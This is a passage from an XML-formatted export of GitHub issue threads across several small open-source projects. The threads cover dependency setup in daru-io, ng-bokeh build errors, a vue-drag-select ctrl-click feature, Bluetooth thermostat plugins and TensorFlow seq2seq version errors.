      <Body>&gt;They were intended to be here and not in the gemspec file due to partial-requiring use-cases. &#13;
&#13;
@athityakumar, I didn't understand this.</Body>
    </Comment>
    <Comment>
      <Owner>athityakumar</Owner>
      <Body>The format-specific dependencies are specified in the Gemfile and not into the gemspec file. That way, a daru-io user will run `gem install daru-io` and only install daru-io, whereas a daru-io developer will run `bundle install` and install all the dependencies being used.&#13;
&#13;
Currently, all dependencies are specified in the Gemfile. It'd be better if we could add them all together rather than adding them one by one.</Body>
    </Comment>
  </Issue_667>
  <Issue_668>
    <Repository>ng-bokeh</Repository>
    <Title>Cannot find ng-bokeh Module</Title>
    <Owner>Shekharrajak</Owner>
    <Body>&gt; ERROR in projects/bokeh-tester/src/app/app.module.ts(5,31): error TS2307: Cannot find module 'ng-bokeh'.&#13;
&#13;
&#13;
After running `npm i`, I'm unable to `ng serve` the project due to not being able to find the ng-bokeh module. I've seen similar issues online be resolved by using relative pathing, but I've been unable to change app.module.ts to work. &#13;
&#13;
Am I missing any steps in order to run this project?&#13;
&#13;
Thanks for your time. </Body>
    <State>open</State>
    <Comment>
      <Owner>StewSchrieff</Owner>
      <Body>I'm also unable to`ng build ng-bokeh`...&#13;
&#13;
&gt; BUILD ERROR&#13;
&gt; ng-bokeh/src/lib/ng-bokeh.component.ts(16,17): error TS2552: Cannot find name 'plt2'. Did you mean 'plt'?&#13;
&gt; &#13;
&gt; Error: ng-bokeh/src/lib/ng-bokeh.component.ts(16,17): error TS2552: Cannot find name 'plt2'. Did you mean 'plt'?&#13;
&gt; &#13;
&gt;     at Object.&lt;anonymous&gt; (C:\Users\Stewart\WebstormProjects\bokeh-example\ng-bokeh\node_modules\ng-packagr\lib\ngc\compile-source-files.js:51:19)&#13;
&gt;     at Generator.next (&lt;anonymous&gt;)&#13;
&gt;     at fulfilled (C:\Users\Stewart\WebstormProjects\bokeh-example\ng-bokeh\node_modules\ng-packagr\lib\ngc\compile-source-files.js:4:58)&#13;
&gt;     at &lt;anonymous&gt;&#13;
&gt; </Body>
    </Comment>
    <Comment>
      <Owner>Shekharrajak</Owner>
      <Body>Thanks for letting me know this issue. I will verify it and let you know.</Body>
    </Comment>
    <Comment>
      <Owner>Shekharrajak</Owner>
      <Body>I believe, you should have error like this : https://github.com/Shekharrajak/ng-bokeh/issues/1</Body>
    </Comment>
  </Issue_668>
  <Issue_669>
    <Repository>ng-bokeh</Repository>
    <Title>Added BokehJS as dependecy but not able to use methods </Title>
    <Owner>Shekharrajak</Owner>
    <Body>&#13;
When I imported the BokehJS in component and tried to get the plotting object `Bokehjs.Plotting`, it is coming as undefined. &#13;
&#13;
&#13;
Here is the console.log(Bokehjs) output : &#13;
&#13;
```&#13;
{version: "1.0.4", embed: {&#8230;}, protocol: {&#8230;}, _testing: {&#8230;}, logger: Logger, &#8230;}&#13;
Models: &#402; (name)&#13;
documents: []&#13;
embed: {add_document_standalone: &#402;, add_document_from_session: &#402;, embed_items_notebook: &#402;, kernels: {&#8230;}, BOKEH_ROOT: "bk-root", &#8230;}&#13;
index: {}&#13;
logger: Logger {_name: "bokeh", _log_level: LogLevel, trace: &#402;, debug: &#402;, info: &#402;, &#8230;}&#13;
protocol: {Message: &#402;, Receiver: &#402;, __esModule: true}&#13;
safely: &#402; safely(fn, silent)&#13;
set_log_level: &#402; set_log_level(level)&#13;
settings: Settings {_dev: false}&#13;
version: "1.0.4"&#13;
_testing: {results: {&#8230;}, init: &#402;, record: &#402;, count: &#402;, clear: &#402;, &#8230;}&#13;
__esModule: true&#13;
__proto__: Object}&#13;
&#13;
```&#13;
&#13;
Also before this I had issue similiar to https://github.com/bokeh/bokeh/issues/8197, that I resolved by modifying the path to relative path in many files of bokehjs (node_module/bokehjs/src/lib/api/**) . &#13;
&#13;
For example &#13;
&#13;
```&#13;
import {isEqual} from "core/util/eq"&#13;
&#13;
```&#13;
is replaced with&#13;
&#13;
```&#13;
import {isEqual} from "../core/util/eq"&#13;
&#13;
```&#13;
&#13;
in `node_module/bokehjs/src/lib/api/plotting.ts`&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>Shekharrajak</Owner>
      <Body>It looks like this issue, is resolved recently in https://github.com/bokeh/bokeh/pull/8782 , need to verify it.</Body>
    </Comment>
  </Issue_669>
  <Issue_670>
    <Repository>vue-drag-select</Repository>
    <Title>expand / reduce selction with strg - click</Title>
    <Owner>stephan281094</Owner>
    <Body>hi there, this is a very useful component,&#13;
is it possible to integrate a select/deselect function, so you can expand/reduce the selection with strg - mouseclick on items&#13;
if not planned can you give me a hint, how to start to implement it&#13;
thank you very much&#13;
marc</Body>
    <State>open</State>
    <Comment>
      <Owner>stephan281094</Owner>
      <Body>Hi @marcdakar, thank you for showing interest in this project!&#13;
The requested feature is definitely something I'd like to have, but it is not (yet) planned.&#13;
&#13;
If you're interested in implementing this feature yourself, the following might be helpful.&#13;
At the moment we have a reactive 'selectedItems' property where we save what items are currently selected. In order to add the functionality you describe, we can add a new reactive property that keeps track of items that you strg - click.&#13;
We can then pass `selectedItems` to the slot, filtering out the items from the new reactive property.&#13;
&#13;
Let me know if that makes sense. Have a great day!&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>marcdakar</Owner>
      <Body>hi stephan, for now i catch in the mousedown event of the component the STRG press and if pressed prevent the mouse-drag ... so i can do the select/deselect logic in parent with @click.strg&#13;
this works very nice, if you like i can give an example&#13;
best regards marc&#13;
ps: this is an unique an well done component, for what i like to see further development</Body>
    </Comment>
    <Comment>
      <Owner>stephan281094</Owner>
      <Body>An example would be great! I'm sure it'd be helpful for people wanting to do the same.</Body>
    </Comment>
    <Comment>
      <Owner>marcdakar</Owner>
      <Body>hi stephan, for sure&#13;
https://teste223.lima-city.de/&#13;
make a selection -&gt; click CTRL and select/deselect with mouse&#13;
and i make a fork&#13;
many greetings marc</Body>
    </Comment>
    <Comment>
      <Owner>Ham3D</Owner>
      <Body>I'm also interested in this feature.</Body>
    </Comment>
    <Comment>
      <Owner>marcdakar</Owner>
      <Body>hi hamed, i have made a fork of this component, with the desired feature ...</Body>
    </Comment>
    <Comment>
      <Owner>stephan281094</Owner>
      <Body>@marcdakar Feel free to submit a PR to make this part of `vue-drag-select`.</Body>
    </Comment>
    <Comment>
      <Owner>marcdakar</Owner>
      <Body>hi stephan, i have ..  but keep in mind that i did this never before ... </Body>
    </Comment>
    <Comment>
      <Owner>stephan281094</Owner>
      <Body>That's awesome! I'll make sure to review it later this week.</Body>
    </Comment>
  </Issue_670>
  <Issue_671>
    <Repository>vue-drag-select</Repository>
    <Title>Make `selectorClass` accept function</Title>
    <Owner>stephan281094</Owner>
    <Body>If `selectorClass` accepts function as value, it could be used for more expressive checks, e.g.&#13;
&#13;
```vue&#13;
&lt;drag-select-container :selectorClass="vm =&gt; vm.$el.hasClass('item')"&gt;&#13;
 &lt;template scope="{ selectedItems }"&gt;&#13;
  &lt;!-- ... --&gt;&#13;
 &lt;/template&gt;&#13;
&lt;/drag-select-container&gt;&#13;
```&#13;
&#13;
But with this name `selectorClass` is not descriptive enough. Maybe rename it to something like `selectableItem`?</Body>
    <State>open</State>
    <Comment>
      <Owner>stephan281094</Owner>
      <Body>Great idea! This should definitely be implemented. I'm not sure about the new name though. I agree that `selectorClass` needs to go, but is `selectableItem` clear enough? (cc @FrancisKong)</Body>
    </Comment>
    <Comment>
      <Owner>FrancisKong</Owner>
      <Body>What about `selectableItems` is an array of nodes or components?</Body>
    </Comment>
  </Issue_671>
  <Issue_672>
    <Repository>homebridge-eq3ble</Repository>
    <Title>Added manualOnly configuration</Title>
    <Owner>maxnowack</Owner>
    <Body>This will tell the thermostat to use manual mode, useful as we want to&#13;
allow Homebridge/Homekit to control the temperature&#13;
&#13;
This PR closes:&#13;
&#13;
https://github.com/maxnowack/homebridge-eq3ble/pull/16</Body>
    <State>open</State>
    <Comment>
      <Owner>joshhornby</Owner>
      <Body>CI is failing with:&#13;
&#13;
```&#13;
npm ERR! cipm can only install packages when your package.json and package-lock.json or npm-shrinkwrap.json are in sync. Please update your lock file with `npm install` before continuing.&#13;
```&#13;
&#13;
Not sure it's linked to this PR.</Body>
    </Comment>
  </Issue_672>
  <Issue_673>
    <Repository>homebridge-eq3ble</Repository>
    <Title>discover times out</Title>
    <Owner>maxnowack</Owner>
    <Body>Hi!&#13;
&#13;
Recently I've encountered multiple problems with discovering the thermostat:&#13;
* after restart only one or two thermostats are discoverable&#13;
* after multiple restarts (and checking every time) - all thermostats are discoverable&#13;
&#13;
however, if eq3ble lost the thermostat - then it wont' rediscover it again.&#13;
at the same time - the eq3 suggested app, calor BT finds every thermostat just fine. &#13;
at the same time when I check the discoverability of thermostats through bluetoothctl - it's all there.&#13;
&#13;
seems like the problem is not in the plugin itself (or I'm completely stupid), but somewhere deeper.&#13;
do you happened to have the same problems?&#13;
how did you solve it?</Body>
    <State>open</State>
    <Comment>
      <Owner>maxnowack</Owner>
      <Body>Maybe related to noble/noble#465</Body>
    </Comment>
  </Issue_673>
  <Issue_674>
    <Repository>node-eq3ble</Repository>
    <Title>can not install on node 10</Title>
    <Owner>maxnowack</Owner>
    <Body>here is my original issue: https://github.com/maxnowack/homebridge-eq3ble/issues/24&#13;
&#13;
package is not installable using node 10 (LTS version now).&#13;
this is most probably because of noble/node-bluetooth-hci-socket#84.&#13;
&#13;
dependencies: node-eq3ble &lt;- noble-device (which is not installable with node 10)&#13;
&#13;
one solution would be to switch the node-eq3ble to https://www.npmjs.com/package/@nullent1ty/noble-device, wdyt ?</Body>
    <State>open</State>
    <Comment>
      <Owner>maxnowack</Owner>
      <Body>Hey @aleksandrsivanovs, I've been rather busy lately and don't have the thermostats anymore to test, so I gave you commit access to node-3q3ble and homebridge-eq3ble to fix this issue and make any changes you'd like&#13;
&#13;
If you give me your npm username, I can give you permission to publish new versions of the package as well.</Body>
    </Comment>
    <Comment>
      <Owner>aleksandrsivanovs</Owner>
      <Body>I have not so much time as well, but will try to manage to do the node 10 building. &#13;
my npm username is aleksandrsivanovs</Body>
    </Comment>
    <Comment>
      <Owner>maxnowack</Owner>
      <Body>I gave you access to the npm packages. It would be awesome if you can manage it to fix the build for node 10 :) </Body>
    </Comment>
  </Issue_674>
  <Issue_675>
    <Repository>react-tracker-connect</Repository>
    <Title>Performance comparison with other packages</Title>
    <Owner>maxnowack</Owner>
    <Body>Hi! 

This looks promising. 

How is performance relative to react-komposer2, createContainer etc? </Body>
    <State>open</State>
    <Comment>
      <Owner>maxnowack</Owner>
      <Body>I developed this package because I wasn't satisfied with the performance of the other solutions.&#13;
The main goal is to rerender as less as possible. One feature, which this package but currently no other package has, is that the reactive function is only executed, if the props that are used in this function have changed.&#13;
&#13;
Example: &#13;
````es6&#13;
import React from 'react'&#13;
import connect from 'react-tracker-connect'&#13;
&#13;
function Post({ title, body, backgroundColor }) {&#13;
  return (&#13;
    &lt;div style={{ backgroundColor }}&gt;&#13;
      &lt;h2&gt;{ title }&lt;/h2&gt;&#13;
      &lt;p&gt;{ body }&lt;/p&gt;&#13;
    &lt;/div&gt;&#13;
  )&#13;
}&#13;
&#13;
export default connect(({ postId }) =&gt; {&#13;
  const { title, body } = Posts.findOne({ _id: postId }, { fields: { title: 1, body: 1 } })&#13;
return { title, body }&#13;
})(Post)&#13;
&#13;
// Usage&#13;
&lt;Post backgroundColor="#fff" postId={ ... } /&gt;&#13;
````&#13;
&#13;
With react-tracker-connect, the reactive function will only rerun if the postId or a reactive dependency, used in this function, has changed (minimongo in this case).&#13;
If you want to change another prop very frequently, which isn't used in the reactive function, it will automatically cache the props and don't rerun. If you change the background color every 100ms for example, the minimongo query would only be executed, if the postId, or the title or body of the post has changed. With all other packages, the query will be unnecessarily rerun.&#13;
This doesn't really matter, if only a few posts are displayed. But imagine you try to render &gt; 500 posts on a single page.&#13;
&#13;
Additionally you can finetune the performance with some [options](https://github.com/maxnowack/react-tracker-connect#options)&#13;
&#13;
I'll leave this issue open for discussing performance of the several tracker-react packages out there. </Body>
    </Comment>
    <Comment>
      <Owner>nadeemja</Owner>
      <Body>Very nice! &#13;
&#13;
We're using Mantra and react-komposer. The performance is painful.&#13;
&#13;
We'll test this is out, and let you know of our results. &#13;
&#13;
@chroz</Body>
    </Comment>
    <Comment>
      <Owner>nadeemja</Owner>
      <Body>Btw, have you yourself tried this in the MantraJS context? </Body>
    </Comment>
    <Comment>
      <Owner>maxnowack</Owner>
      <Body>No, I'm not using Mantra. Please let me know if you're experiencing any issues.&#13;
You should also take a look at the [reactive-cache](https://github.com/maxnowack/meteor-reactive-cache) package. It's another package I've build to improve the render performance of [TeamGrid](https://teamgridapp.com)</Body>
    </Comment>
  </Issue_675>
  <Issue_676>
    <Repository>tizli-checklists</Repository>
    <Title>test issue edited</Title>
    <Owner>emenoh</Owner>
    <Body>Something can go here -   edited&#13;
&#13;
@jhatfield &#13;
**adfasdfas**&#13;
&#13;
&#13;
![cac-sign jpg](https://cloud.githubusercontent.com/assets/2375323/23379564/04ada930-fcfd-11e6-969a-565f2c2e4765.jpg)&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>emenoh</Owner>
      <Body>Another issue can go here</Body>
    </Comment>
    <Comment>
      <Owner>emenoh</Owner>
      <Body>Why wouldn't I put another issue here - edited</Body>
    </Comment>
  </Issue_676>
  <Issue_677>
    <Repository>accounts-entry</Repository>
    <Title>Send Verification Email not working</Title>
    <Owner>selaias</Owner>
    <Body>Hi, I am unable to enforce email verification using this package. Does this package supports this?
</Body>
    <State>open</State>
    <Comment>
      <Owner>selaias</Owner>
      <Body>I guess you should set the MAIL_URL variable in order to be able to send emails.
</Body>
    </Comment>
    <Comment>
      <Owner>ankitv89</Owner>
      <Body>It is set. I checked by using a separate method to send emails and they were triggered. I have set `waitEmailVerification: true`   on client as well as server.

Also, the user can login even with his unverified email.

Is there some other settings I am missing?
</Body>
    </Comment>
  </Issue_677>
  <Issue_678>
    <Repository>meteor-cookie-consent</Repository>
    <Title>CookieConsentImply onCreated missing</Title>
    <Owner>selaias</Owner>
    <Body>Hi there:&#13;
&#13;
I'm getting this error:&#13;
```&#13;
Exception in template helper: TypeError: Cannot read property 'get' of undefined&#13;
    at Object.showMessage (http://127.0.0.1:3000/packages/selaias_cookie-consent.js?hash=82969d9e01cb7a9989e1f69d982a1af5b377b402:266:50)&#13;
```&#13;
&#13;
using `cookieConsentImply` because `cookieStatus` reactive var is not created with this template only in `cookieConsent`  template.&#13;
&#13;
See:&#13;
https://github.com/selaias/meteor-cookie-consent/blob/58e546ea9464c07ff9e20f05f01dc6259d387a8d/client/cookie_consent.js#L47</Body>
    <State>open</State>
    <Comment>
      <Owner>selaias</Owner>
      <Body>Hi there, I guess this has to be rewritten as it is quite old actually. Can you help?&#13;
&#13;
</Body>
    </Comment>
  </Issue_678>
  <Issue_679>
    <Repository>meteor-fit-api</Repository>
    <Title>Supported apis</Title>
    <Owner>selaias</Owner>
    <Body>Is RunKeeper the only supported API at this time?
</Body>
    <State>open</State>
    <Comment>
      <Owner>selaias</Owner>
      <Body>Currently only Runkeeper and Strava are supported, with Runkeeper having also some patterns on endpoints for schema validations. the idea is to have all endpoints with all patterns for as many Fitness APIs I can get.
</Body>
    </Comment>
    <Comment>
      <Owner>ryanbuiltthat</Owner>
      <Body>I've got some of the fitbit endpoints working in general, what I'm having a hard time doing is getting the Oauth access through fitbit using meteor. I would gladly help out with the Fitbit API if you could help navigate the oauth puzzle.
</Body>
    </Comment>
    <Comment>
      <Owner>selaias</Owner>
      <Body>are you using the selaias:accounts-fitbit  package?
what is the problem?
</Body>
    </Comment>
  </Issue_679>
  <Issue_680>
    <Repository>strava</Repository>
    <Title>How do i use this with meteor and React?</Title>
    <Owner>selaias</Owner>
    <Body>Hi, i am currently a beginner in javascript and currently i am building a Meteor and React web app for my school project to make an API call to strava.com&#13;
Are you able to guide me in using your library to make that API call?</Body>
    <State>open</State>
    <Comment>
      <Owner>selaias</Owner>
      <Body>I haven''t worked yet with React on this, but i guess you can get more info here &#13;
&#13;
https://github.com/studiointeract/accounts-ui&#13;
&#13;
</Body>
    </Comment>
  </Issue_680>
  <Issue_681>
    <Repository>augmented_seq2seq</Repository>
    <Title>How to get encoder_final_outputs?</Title>
    <Owner>suriyadeepan</Owner>
    <Body>Hello @suriyadeepan, nice repo you got here. I am trying to resolve https://github.com/tensorflow/tensorflow/issues/10862 this bug. I find you functional scan method refreshing. My only question: how to get the outputs from the rnn?&#13;
&#13;
For a typical bidirectional_dynamic_rnn, the return result is output and state:&#13;
```python&#13;
with tf.variable_scope("ENCODE"):&#13;
    enc_cells_fw = []&#13;
    for i in range(0, encoder_depth):&#13;
        with tf.variable_scope('enc_RNN_{}'.format(i)):&#13;
            cell = tf.contrib.rnn.LSTMCell(hidden_dim)  # Or LSTMCell(hidden_dim)&#13;
            cell = tf.contrib.rnn.DropoutWrapper(cell, output_keep_prob=1.0-dropout)&#13;
            enc_cells_fw.append(cell)&#13;
    enc_cell_fw = tf.contrib.rnn.MultiRNNCell(enc_cells_fw)&#13;
    enc_cells_bw = []&#13;
    for i in range(0, encoder_depth):&#13;
        with tf.variable_scope('enc_RNN_{}'.format(i)):&#13;
            cell = tf.contrib.rnn.LSTMCell(hidden_dim)  # Or LSTMCell(hidden_dim)&#13;
            cell = tf.contrib.rnn.DropoutWrapper(cell, output_keep_prob=1.0-dropout)&#13;
            enc_cells_bw.append(cell)&#13;
    enc_cell_bw = tf.contrib.rnn.MultiRNNCell(enc_cells_bw)&#13;
&#13;
    enc_inp_len = np.array([seq_length_in for _ in range(batch_size)])&#13;
&#13;
    ((encoder_fw_outputs,&#13;
      encoder_bw_outputs),&#13;
     (encoder_fw_final_state,&#13;
      encoder_bw_final_state)) = (&#13;
        tf.nn.bidirectional_dynamic_rnn(cell_fw=enc_cell_fw,&#13;
                                        cell_bw=enc_cell_bw,&#13;
                                        inputs=enc_inp,&#13;
                                        sequence_length=enc_inp_len,&#13;
                                        dtype=tf.float32)&#13;
        )&#13;
    encoder_outputs = tf.concat((encoder_fw_outputs, encoder_bw_outputs), 2)&#13;
&#13;
    encoder_final_state_c = tf.concat((encoder_fw_final_state[0].c, encoder_bw_final_state[0].c), 1)&#13;
&#13;
    encoder_final_state_h = tf.concat((encoder_fw_final_state[0].h, encoder_bw_final_state[0].h), 1)&#13;
&#13;
    encoder_final_state = tf.contrib.rnn.LSTMStateTuple(&#13;
        c=encoder_final_state_c,&#13;
        h=encoder_final_state_h&#13;
    )&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>rickyhan</Owner>
      <Body>I have figured it out:&#13;
&#13;
```&#13;
    enc_cells_fw = []&#13;
    for i in range(0, encoder_depth):&#13;
        with tf.variable_scope('enc_RNN_{}'.format(i)):&#13;
            cell = tf.contrib.rnn.LSTMCell(hidden_dim)  # Or LSTMCell(hidden_dim)&#13;
            cell = tf.contrib.rnn.DropoutWrapper(cell, output_keep_prob=1.0-dropout)&#13;
            enc_cells_fw.append(cell)&#13;
    enc_cell_fw = tf.contrib.rnn.MultiRNNCell(enc_cells_fw, state_is_tuple=True)&#13;
    enc_cells_bw = []&#13;
    for i in range(0, encoder_depth):&#13;
        with tf.variable_scope('enc_RNN_{}'.format(i)):&#13;
            cell = tf.contrib.rnn.LSTMCell(hidden_dim)  # Or LSTMCell(hidden_dim)&#13;
            cell = tf.contrib.rnn.DropoutWrapper(cell, output_keep_prob=1.0-dropout)&#13;
            enc_cells_bw.append(cell)&#13;
    enc_cell_bw = tf.contrib.rnn.MultiRNNCell(enc_cells_bw, state_is_tuple=True)&#13;
&#13;
&#13;
    init_state = enc_cell_fw.zero_state(batch_size=batch_size, dtype=tf.float32)&#13;
&#13;
    # transpose encoder inputs to time-major&#13;
    enc_inp_t = tf.transpose(enc_inp, [1,0,2])&#13;
    #&#13;
    # der bi encoder&#13;
    with tf.variable_scope('encoder-fw') as scope: # forward sequence&#13;
        enc_output_fw, enc_states_fw = tf.scan(lambda (_, st_1), x : enc_cell_fw(x, st_1),&#13;
                enc_inp_t, initializer=(tf.zeros(shape=[batch_size, hidden_dim]), init_state))&#13;
&#13;
    with tf.variable_scope('encoder-bw') as scope: # backward sequence&#13;
        enc_output_bw, enc_states_bw = tf.scan(lambda (_, st_1), x : enc_cell_bw(x, st_1),&#13;
                            tf.reverse(enc_inp_t, axis=[0]), # &lt;- reverse inputs&#13;
                            initializer=(tf.zeros(shape=[batch_size, hidden_dim]), init_state))&#13;
&#13;
    enc_output_fw = tf.transpose(enc_output_fw, [1,0,2])&#13;
    enc_output_bw = tf.transpose(enc_output_bw, [1,0,2])&#13;
    encoder_outputs = tf.concat([enc_output_fw, enc_output_bw], 2)&#13;
&#13;
    # project context&#13;
    Wc = tf.get_variable('Wc', shape=[2, encoder_depth, hidden_dim*2, hidden_dim*2],&#13;
                        initializer=tf.contrib.layers.xavier_initializer())&#13;
&#13;
    # extract context [get final state; project c,h to [hidden_dim]; list-&gt;tuple]&#13;
    encoder_final_state = []&#13;
    for layer in range(encoder_depth):&#13;
        enc_c = tf.concat( (enc_states_fw[layer].c[-1], enc_states_bw[layer].c[-1]), 1)&#13;
        enc_c = tf.matmul(enc_c, Wc[0][layer])&#13;
        enc_h = tf.concat( (enc_states_fw[layer].h[-1], enc_states_bw[layer].h[-1]), 1)&#13;
        enc_h = tf.matmul(enc_h, Wc[1][layer])&#13;
        encoder_final_state.append(tf.contrib.rnn.LSTMStateTuple(c = enc_c, h = enc_h))&#13;
    # convert list to tuple - eww!&#13;
    encoder_final_state = tuple(encoder_final_state)&#13;
&#13;
```</Body>
    </Comment>
  </Issue_681>
  <Issue_682>
    <Repository>datasets</Repository>
    <Title>No module named datasets.twitter</Title>
    <Owner>suriyadeepan</Owner>
    <Body>I am trying to run `python 03-Twitter-chatbot.py` but getting error&#13;
`I tensorflow/stream_executor/dso_loader.cc:135] successfully opened CUDA library libcublas.so.8.0 locally&#13;
I tensorflow/stream_executor/dso_loader.cc:135] successfully opened CUDA library libcudnn.so.5 locally&#13;
I tensorflow/stream_executor/dso_loader.cc:135] successfully opened CUDA library libcufft.so.8.0 locally&#13;
I tensorflow/stream_executor/dso_loader.cc:135] successfully opened CUDA library libcuda.so.1 locally&#13;
I tensorflow/stream_executor/dso_loader.cc:135] successfully opened CUDA library libcurand.so.8.0 locally&#13;
Traceback (most recent call last):&#13;
  File "03-Twitter-chatbot.py", line 8, in &lt;module&gt;&#13;
    from datasets.twitter import data&#13;
ImportError: No module named datasets.twitter&#13;
`</Body>
    <State>open</State>
    <Comment>
      <Owner>shanthivardhan</Owner>
      <Body>I faced similar issue with python2.7 but tried the same running with python3 and everything seems fine.</Body>
    </Comment>
  </Issue_682>
  <Issue_683>
    <Repository>easy_seq2seq</Repository>
    <Title>AttributeError: module 'tensorflow.python.ops.nn' has no attribute 'seq2seq'</Title>
    <Owner>suriyadeepan</Owner>
    <Body>Hi guys, Im trying to running it into a python3.5, tf 1.0.1 and I'm getting this:&#13;
&#13;
AttributeError: module 'tensorflow.python.ops.nn' has no attribute 'seq2seq'&#13;
&#13;
I already have installed the tensorflow.models into the tensorflow, but cant find the seq2seq anywhere to update it.&#13;
&#13;
What should I do?</Body>
    <State>open</State>
    <Comment>
      <Owner>AkishinoShiame</Owner>
      <Body>I'm using the older version of tensorflow (0.12.1) without problem. </Body>
    </Comment>
    <Comment>
      <Owner>Denisolt</Owner>
      <Body>@canivel use virtual environment and install tensorflow 0.12</Body>
    </Comment>
    <Comment>
      <Owner>sowntharsakthi</Owner>
      <Body>AttributeError: module 'tensorflow.python.ops.nn' has no attribute 'Seq2Seq'....how to solve it..&#13;
&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>vivek9237</Owner>
      <Body>AttributeError: module 'tensorflow.python.ops.nn' has no attribute 'seq2seq' ...need help here @suriyadeepan </Body>
    </Comment>
    <Comment>
      <Owner>Denisolt</Owner>
      <Body>@vivek9237 try what I wrote above. </Body>
    </Comment>
    <Comment>
      <Owner>blueseasky</Owner>
      <Body>I change the version of my tensorflow  from 1.4.0 to 0.12.1,and solve the problem. But I don`t know why.</Body>
    </Comment>
    <Comment>
      <Owner>AkishinoShiame</Owner>
      <Body>See the change log of tensorflow then it will be clear.&#13;
https://github.com/tensorflow/tensorflow/blob/master/RELEASE.md&#13;
After update to 1.0.0 and above, they change the location of seq2seq from tf.nn.seq2seq to tf.contrib.legacy_seq2seq&#13;
https://www.tensorflow.org/api_docs/python/tf/contrib/legacy_seq2seq</Body>
    </Comment>
    <Comment>
      <Owner>manav1289</Owner>
      <Body>use tensorflow.contrib.seq2seq wherever tensorflow.python.ops.nn you have written&#13;
it worked for me</Body>
    </Comment>
  </Issue_683>
  <Issue_684>
    <Repository>easy_seq2seq</Repository>
    <Title>ValueError: Shape must be rank 2 but is rank 1</Title>
    <Owner>suriyadeepan</Owner>
    <Body>when i use python 3.6 ,and tensorflow 1.0.   execute python execute.py, i encounter the bellow prolem.&#13;
can you help me to find out the reason?  &#13;
&#13;
File "/home/wel/deeplearning/easybot/seq2seq_model.py", line 93, in sampled_loss&#13;
    self.target_vocab_size)&#13;
  File "/home/wel/.pyenv/versions/3.6.0/lib/python3.6/site-packages/tensorflow/python/ops/nn_impl.py", line 1191, in sampled_softmax_loss&#13;
    name=name)&#13;
  File "/home/wel/.pyenv/versions/3.6.0/lib/python3.6/site-packages/tensorflow/python/ops/nn_impl.py", line 947, in _compute_sampled_logits&#13;
    range_max=num_classes)&#13;
  File "/home/wel/.pyenv/versions/3.6.0/lib/python3.6/site-packages/tensorflow/python/ops/candidate_sampling_ops.py", line 134, in log_uniform_candidate_sampler&#13;
    seed2=seed2, name=name)&#13;
  File "/home/wel/.pyenv/versions/3.6.0/lib/python3.6/site-packages/tensorflow/python/ops/gen_candidate_sampling_ops.py", line 357, in _log_uniform_candidate_sampler&#13;
    name=name)&#13;
  File "/home/wel/.pyenv/versions/3.6.0/lib/python3.6/site-packages/tensorflow/python/framework/op_def_library.py", line 763, in apply_op&#13;
    op_def=op_def)&#13;
  File "/home/wel/.pyenv/versions/3.6.0/lib/python3.6/site-packages/tensorflow/python/framework/ops.py", line 2397, in create_op&#13;
    set_shapes_for_outputs(ret)&#13;
  File "/home/wel/.pyenv/versions/3.6.0/lib/python3.6/site-packages/tensorflow/python/framework/ops.py", line 1757, in set_shapes_for_outputs&#13;
    shapes = shape_func(op)&#13;
  File "/home/wel/.pyenv/versions/3.6.0/lib/python3.6/site-packages/tensorflow/python/framework/ops.py", line 1707, in call_with_requiring&#13;
    return call_cpp_shape_fn(op, require_shape_fn=True)&#13;
  File "/home/wel/.pyenv/versions/3.6.0/lib/python3.6/site-packages/tensorflow/python/framework/common_shapes.py", line 610, in call_cpp_shape_fn&#13;
    debug_python_shape_fn, require_shape_fn)&#13;
  File "/home/wel/.pyenv/versions/3.6.0/lib/python3.6/site-packages/tensorflow/python/framework/common_shapes.py", line 675, in _call_cpp_shape_fn_impl&#13;
    raise ValueError(err.message)&#13;
ValueError: Shape must be rank 2 but is rank 1 for 'model_with_buckets/sequence_loss/sequence_loss_by_example/sampled_softmax_loss/LogUniformCandidateSampler' (op: 'LogUniformCandidateSampler') with input shapes: [?].&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>krzysztofjordan</Owner>
      <Body>The tensorflow people switched out the order of labels and inputs &#13;
&#13;
change this line to look like this: &#13;
 return tf.nn.sampled_softmax_loss(w_t, b, labels, inputs, num_samples,&#13;
                self.target_vocab_size)&#13;
in seq2seq_model.py</Body>
    </Comment>
    <Comment>
      <Owner>ellurunaresh</Owner>
      <Body>Hi,&#13;
I am using python 2.7 and tensorflow=1.3.0&#13;
I tried the above approach but I couldn't solve the problem. I got another error&#13;
&#13;
ValueError: Shape must be rank 2 but is rank 1 for 'model_with_buckets/sequence_loss/sequence_loss_by_example/sampled_softmax_loss/MatMul_1' (op: 'MatMul') with input shapes: [?], [?,512]&#13;
&#13;
Could you please let me know how you solved this problem.&#13;
</Body>
    </Comment>
  </Issue_684>
  <Issue_685>
    <Repository>easy_seq2seq</Repository>
    <Title>Wrong when implementing given attention example</Title>
    <Owner>suriyadeepan</Owner>
    <Body>Hello,&#13;
&#13;
When I implemented the example given from readme, &#13;
`model = AttentionSeq2Seq(input_dim=5, input_length=7, hidden_dim=10, output_length=8, output_dim=20, depth=4)`&#13;
It outputs wrong message as following&#13;
`ValueError: Shape must be rank 2 but is rank 3 for 'MatMul_17' (op: 'MatMul') with input shapes: [?,?], [?,?,10].`&#13;
&#13;
My keras version is 1.2.2, tensorflow version is 1.0.0, is there anyone who met the same problem?&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>zhangkang28</Owner>
      <Body>maybe you can replace "encoder_cell = copy.deepcopy(cell)" with "encoder_cell = cell" in seq2seq.py</Body>
    </Comment>
  </Issue_685>
  <Issue_686>
    <Repository>easy_seq2seq</Repository>
    <Title>Why are you only using 2/3 of the gpu memory for training?</Title>
    <Owner>suriyadeepan</Owner>
    <Body># Only allocate 2/3 of the gpu memory to allow for running gpu-based predictions while training:&#13;
&#13;
What's the logic for this decision?</Body>
    <State>open</State>
    <Comment>
      <Owner>jrthom18</Owner>
      <Body>I had the same question on the other repo...see the commit's comments: https://github.com/llSourcell/tensorflow_chatbot/commit/b8959e38a0284e970fb9b99e62f1f5f3d85e9c8e</Body>
    </Comment>
  </Issue_686>
  <Issue_687>
    <Repository>easy_seq2seq</Repository>
    <Title>Question about training time</Title>
    <Owner>suriyadeepan</Owner>
    <Body>How long should it take to train on a CPU? I'm using a MacBook Air with a 1.3 GHz Intel Core i5 processor and 4 GB 1600 MHz DDR3 of memory.</Body>
    <State>open</State>
    <Comment>
      <Owner>thunderbird</Owner>
